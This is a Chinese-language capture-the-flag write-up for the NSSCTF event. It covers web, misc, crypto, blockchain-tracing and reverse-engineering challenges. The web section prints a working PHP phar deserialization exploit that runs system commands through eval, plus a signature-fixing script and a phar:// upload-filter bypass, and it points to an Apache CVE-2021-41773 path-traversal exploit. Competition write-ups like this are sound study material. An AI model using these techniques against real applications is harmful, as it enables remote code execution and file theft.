---
title: NSSCTF
date: 2022-08-03 18:35:00
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![44fa6dabcc](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031847359.png?x-oss-process=hzy)

<!--more-->

# web

## 1zweb

![image-20220803101042557](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031010677.png?x-oss-process=hzy)

上传题？尝试一下文件读取

![image-20220803101113721](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011786.png?x-oss-process=hzy)

目录穿越呢？

![image-20220803101126893](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011952.png?x-oss-process=hzy)

![image-20220803101136271](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011322.png?x-oss-process=hzy)

NSSCTF{c2121501-15be-4f89-a68d-ac3a3a21c33d}

## ez_rce

![image-20220803103635455](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031036517.png?x-oss-process=hzy)

中间件漏洞

[(50条消息) Apahce HTTPd 2.4.49（CVE-2021-41773）漏洞复现详细教程_W小哥1的博客-CSDN博客_apusic漏洞](https://blog.csdn.net/weixin_40412037/article/details/120777496)

![image-20220803104224098](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031042179.png?x-oss-process=hzy)

![image-20220803104238375](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031042449.png?x-oss-process=hzy)

NSSCTF{60150876-f52f-426a-b1aa-8be494823ece}

## 1zweb(revenge)

升级版，再那样读取回显nonono

考察phar反序列化

```
<?php
class LoveNss{
    public $ljt;
    public $dky;
    public $cmd;
    public function __construct(){
        $this->ljt="Misc";
        $this->dky="Re";
        $this->cmd='system("cat /flag");';
        
    }
    public function __destruct(){
        if($this->ljt==="Misc"&&$this->dky==="Re")
            eval($this->cmd);
    }
    public function __wakeup(){
        $this->ljt="Re";
        $this->dky="Misc";
    }
}
$poc=new LoveNss();
$phar = new Phar('1.phar');
$phar -> startBuffering();       
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');  
$phar -> addFromString('test.txt','test');    
$phar -> setMetadata($poc);    
$phar -> stopBuffering();  
```

这里需要注意要绕过wakeup魔法函数修改一下LoveNss":3->4,这样还是不行，百度之后发现需要对phar包重新校验，找了个校验脚本

```
from hashlib import sha1
f = open('./1.phar', 'rb').read() 
print(f)
s = f[:-28] 
h = f[-8:] 
#print(h)
newf = s+sha1(s).digest()+h 
print(newf)
open('2.phar', 'wb').write(newf) 
```

![image-20220803175323880](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031753985.png?x-oss-process=hzy)

然后phar被过滤，骚姿势走起来，压缩包绕过，phar包压缩之后改png上传然后phar读取

```
phar://./upload/1.png
```

![image-20220803175656584](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031756699.png?x-oss-process=hzy)

NSSCTF{708aa70b-4077-4194-b56c-b89db88a6644} 

# misc

## Signin

[Image Layer Details - hggg/flag:v0 | Docker Hub](https://hub.docker.com/layers/hggg/flag/v0/images/sha256-a0893595a0172bf96637fdee8f760248248b1794070f7a300aee5e5d946c9e03?context=explore)

浅找一下就出了，misc嘛，不解释了

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031652268.png?x-oss-process=hzy)

NSSCTF{WDLJT_SUPER_MY_MAN}

## **Pixel_Signin**

先提取rgb

```
from PIL import Image
import struct
width = 31
height = 31
img=Image.open("Pixel_Signin.png")
s=[]
for i in range(width):
	for j in range(height):
		pi=img.getpixel((j,i))
		for k in range(3):
			s.append(pi[k])
with open('flag.txt', 'wb')as fp:
    for x in s:
        string = struct.pack('B', x)
        fp.write(string)
```

得到内容

```
Gur dhvpx oebja sbk whzcf bire gur ynml qbt vf na Ratyvfu-ynathntr cnatenzn fragrapr gung pbagnvaf nyy gur yrggref bs gur nycunorg. Gur cuenfr vf pbzzbayl hfrq sbe gbhpu-glcvat cenpgvpr, grfgvat glcrjevgref naq pbzchgre xrlobneqf, qvfcynlvat rknzcyrf bs sbagf, naq bgure nccyvpngvbaf vaibyivat grkg jurer gur hfr bs nyy yrggref va gur nycunorg vf qrfverq.Gur rneyvrfg xabja nccrnenapr bs gur cuenfr jnf va Gur Obfgba Wbheany. Va na negvpyr gvgyrq Pheerag Abgrf va gur Sroehnel , rqvgvba, gur cuenfr vf zragvbarq nf n tbbq cenpgvpr fragrapr sbe jevgvat fghqragf N snibevgr pbcl frg ol jevgvat grnpuref sbe gurve chcvyf vf gur sbyybjvat, orpnhfr vg pbagnvaf rirel yrggre bs gur nycunorg N dhvpx oebja sbk whzcf bire gur ynml qbt. Qbmraf bs bgure arjfcncref choyvfurq gur cuenfr bire gur arkg srj zbaguf, nyy hfvat gur irefvba bs gur fragrapr fgnegvat jvgu N engure guna Gur. Gur rneyvrfg xabja hfr bs gur cuenfr fgnegvat jvgu Gur vf sebz gur  obbx Vyyhfgengvir Fubegunaq ol Yvaqn Oebafba. Gur zbqrea sbez fgnegvat jvgu Gur orpnzr zber pbzzba rira gubhtu vg vf fyvtugyl ybatre guna gur bevtvany fgnegvat jvgu N.N  rqvgvba bs gur Ybf Natryrf Urenyq Fhaqnl Zntnmvar erpbeqf gung jura gur Arj Lbex Urenyq jnf rdhvccvat na bssvpr jvgu glcrjevgref n srj lrnef ntb, fgnss sbhaq gung gur pbzzba cenpgvpr fragrapr bs abj vf gur gvzr sbe nyy tbbq zra gb pbzr gb gur nvq bs gur cnegl qvq abg snzvyvnevmr glcvfgf jvgu gur ragver nycunorg, naq ena bagb gjb yvarf va n arjfcncre pbyhza. AFFPGS{Unehxv_vf_AFF_FHCREZNA_fb_guvf_gnfx_vf_rnfl} Gurl jevgr gung n fgnss zrzore anzrq Neguhe S. Phegvf vairagrq gur dhvpx oebja sbk cnatenz gb nqqerff guvf.Nf gur hfr bs glcrjevgref terj va gur yngr gu praghel, gur cuenfr ortna nccrnevat va glcvat yrffba obbxf nf n cenpgvpr fragrapr. Rneyl rknzcyrf vapyhqr Ubj gb Orpbzr Rkcreg va Glcrjevgvat N Pbzcyrgr Vafgehpgbe Qrfvtarq Rfcrpvnyyl sbe gur Erzvatgba Glcrjevgre , naq Glcrjevgvat Vafgehpgbe naq Fgrabtencuref Unaq-obbx. Ol gur ghea bs gur gu praghel, gur cuenfr unq orpbzr jvqryl xabja. Va gur Wnahnel ,vffhr bs Cvgznaf Cubargvp Wbheany, vg vf ersreerq gb nf gur jryy xabja zrzbevmrq glcvat yvar rzoenpvat nyy gur yrggref bs gur nycunorg. Eboreg Onqra-Cbjryyf obbx Fpbhgvat sbe Oblf  hfrf gur cuenfr nf n cenpgvpr fragrapr sbe fvtanyvat.Gur svefg zrffntr frag ba gur ZbfpbjJnfuvatgba ubgyvar ba Nhthfg , , jnf gur grfg cuenfr GUR DHVPX OEBJA SBK WHZCRQ BIRE GUR YNML QBTF ONPX . Yngre, qhevat grfgvat, gur Ehffvna genafyngbef frag n zrffntr nfxvat gurve Nzrevpna pbhagrecnegf, Jung qbrf vg zrna jura lbhe crbcyr fnl Gur dhvpx oebja sbk whzcrq bire gur ynml qbt? Qhevat gur gu praghel, grpuavpvnaf grfgrq glcrjevgref naq gryrcevagref ol glcvat gur fragrapr.Vg vf gur fragrapr hfrq va gur naahny Mnare-Oybfre Angvbany Unaqjevgvat Pbzcrgvgvba, n phefvir jevgvat pbzcrgvgvba juvpu unf orra uryq va gur H.F. fvapr                                  
```

rot13解密

```
The quick brown fox jumps over the lazy dog is an English-language pangrama sentence that contains all the letters of the alphabet. The phrase is commonly used for touch-typing practice, testing typewriters and computer keyboards, displaying examples of fonts, and other applications involving text where the use of all letters in the alphabet is desired.The earliest known appearance of the phrase was in The Boston Journal. In an article titled Current Notes in the February , edition, the phrase is mentioned as a good practice sentence for writing students A favorite copy set by writing teachers for their pupils is the following, because it contains every letter of the alphabet A quick brown fox jumps over the lazy dog. Dozens of other newspapers published the phrase over the next few months, all using the version of the sentence starting with A rather than The. The earliest known use of the phrase starting with The is from the  book Illustrative Shorthand by Linda Bronson. The modern form starting with The became more common even though it is slightly longer than the original starting with A.A  edition of the Los Angeles Herald Sunday Magazine records that when the New York Herald was equipping an office with typewriters a few years ago, staff found that the common practice sentence of now is the time for all good men to come to the aid of the party did not familiarize typists with the entire alphabet, and ran onto two lines in a newspaper column. NSSCTF{Haruki_is_NSS_SUPERMAN_so_this_task_is_easy} They write that a staff member named Arthur F. Curtis invented the quick brown fox pangram to address this.As the use of typewriters grew in the late th century, the phrase began appearing in typing lesson books as a practice sentence. Early examples include How to Become Expert in Typewriting A Complete Instructor Designed Especially for the Remington Typewriter , and Typewriting Instructor and Stenographers Hand-book. By the turn of the th century, the phrase had become widely known. In the January ,issue of Pitmans Phonetic Journal, it is referred to as the well known memorized typing line embracing all the letters of the alphabet. Robert Baden-Powells book Scouting for Boys  uses the phrase as a practice sentence for signaling.The first message sent on the MoscowWashington hotline on August , , was the test phrase THE QUICK BROWN FOX JUMPED OVER THE LAZY DOGS BACK . Later, during testing, the Russian translators sent a message asking their American counterparts, What does it mean when your people say The quick brown fox jumped over the lazy dog? During the th century, technicians tested typewriters and teleprinters by typing the sentence.It is the sentence used in the annual Zaner-Bloser National Handwriting Competition, a cursive writing competition which has been held in the U.S. since
```

NSSCTF{Haruki_is_NSS_SUPERMAN_so_this_task_is_easy}

## Type Message

附件是一堆按键音

![image-20220803120859216](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031208307.png?x-oss-process=hzy)、

用dtmf提取按键，找了很多都不能用，在GitHub找了个可以

[ribt/dtmf-decoder: Extract phone numbers from an audio recording of the dial tones. (github.com)](https://github.com/ribt/dtmf-decoder)

![image-20220803124829879](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031248962.png?x-oss-process=hzy)

然后提取数字之后九键解密

62 74 74 23 81 33 31 81 61 33 43 74 73 32 21 53 53 93 32 21 74 93

NSSCTF{DTMFISREALLYEASY}

## Knight's Tour!

附件压缩包打不开，查看发现文件头问题

![image-20220803135722810](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031357012.png?x-oss-process=hzy)

但是还是解压不出考虑，winrar修复一下，然后解压出来了

![image-20220803141948453](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031419532.png?x-oss-process=hzy)

骑士之旅，象棋里边的马，走法一样，上棋盘下走法

棋盘只有一个k，逆推一下得到起点坐标是（7，3），跑完之后就是这样

![image-20220803143818647](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031438726.png?x-oss-process=hzy)

然后红0黄1，转字符

```
01000011

01101000

00110001

01110110

01000000

01101100

01110010

01111001
```

[二进制到字符串转换器 (rapidtables.org)](https://www.rapidtables.org/zh-CN/convert/number/binary-to-string.html)

最后结果Ch1v@lry

NSSCTF{Ch1v@lry}

# crypto

## ezcrypto

原题

[Dest0g3 520迎新赛 | Lazzaro (lazzzaro.github.io)](https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520迎新赛/)

**主要是求seed**

**爆破得出seed**

```python
from ecdsa.numbertheory import inverse_mod
a = 2659869614
b = 3138014669
m = 2171187379
state1 = 32421
state2 = 32382
c = 628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578
c = list(bytes.fromhex(hex(c)[2:]))




for i in range(65536):
    s1 = (state1 << 16) + i
    s2 = (a * s1 + b) % m
    if s2 >> 16 == state2:
        seed = ((s1 - b) * inverse_mod(a, m)) % m
        print(seed)
# 255387149
# 79695939
```

**再求flag**

```python
c = 628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578
c = list(bytes.fromhex(hex(c)[2:]))
seed = [79695939,255387149]

for k in seed:
    class LCG:
        def __init__(self):
            self.a = 2659869614
            self.b = 3138014669
            self.m = 2171187379
            self.seed = k

        def next(self):
            self.seed = (self.a * self.seed + self.b) % self.m
            return self.seed >> 16


    lcg = LCG()
    lcg.next()
    lcg.next()
    flag = ''
    for i in range(len(c)):
        flag += chr(c[i] ^ (lcg.next() % 10))
    print(flag)

#NSSCTF{378f571491e6559d41ffa02e7a76653e}
#IQRBSFy2:5d26<383c?327e4;gfa16a?n6:779er
```



# ETH

## Bridge

> OKC 地址 0x26eD1a5Ce072aB407C9d24b434f9be43b9ADDCe5 发生了大额快进快出，经过溯源可以找到他来源于一个 BSC 地址，请找出该 Bridge 在 BSC 上的交易tx NSSCTF{0x****************************************************************}

[OKC区块0x26eD...ADDCe5 块地址 余额 总交易次数 | OKLink区块链浏览器](https://www.oklink.com/zh-cn/okc/address/0x26eD1a5Ce072aB407C9d24b434f9be43b9ADDCe5)

查询okc地址，得到kip20交易地址

![image-20220803150203562](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031502637.png?x-oss-process=hzy)

![image-20220803150232804](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031502882.png?x-oss-process=hzy)

BSC--->OKC,跨链交易

筛选条件，还有相关金额时间，得到源头

![image-20220803151255948](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031512050.png?x-oss-process=hzy)

NSSCTF{0xf787c44151fe21da13c213e3adaa7796176e09b9364eb6f52aa43e387ce4b455}

# RE

## **hide_and_seek**

动态调试发现需要传入文件名参数，然后就是动调了

![image-20220805185135702](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208051851165.png?x-oss-process=hzy)

NSSCTF{h1d3_0n_h34p}

# 总结

最后第八，难得前十，贴纸我来啦![image-20220803182922932](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031829140.png?x-oss-process=hzy)